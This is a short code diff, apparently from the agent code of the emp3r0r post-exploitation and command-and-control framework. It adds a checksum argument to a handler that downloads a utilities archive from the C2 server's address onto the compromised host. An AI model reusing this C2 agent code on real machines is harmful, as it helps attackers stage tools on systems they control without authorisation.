@@ -18,7 +18,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-func VaccineHandler() (out string) {
+func VaccineHandler(checksum string) (out string) {
 	if runtime.GOOS != "linux" {
 		return "Only supported in Linux"
 	}
@@ -42,7 +42,7 @@ func VaccineHandler() (out string) {
 	)
 
 	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/"+UtilsArchive)
-	_, err := SmartDownload(UtilsArchive, RuntimeConfig.AgentRoot+"/"+UtilsArchive)
+	_, err := SmartDownload(UtilsArchive, RuntimeConfig.AgentRoot+"/"+UtilsArchive, checksum)
 	out = "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
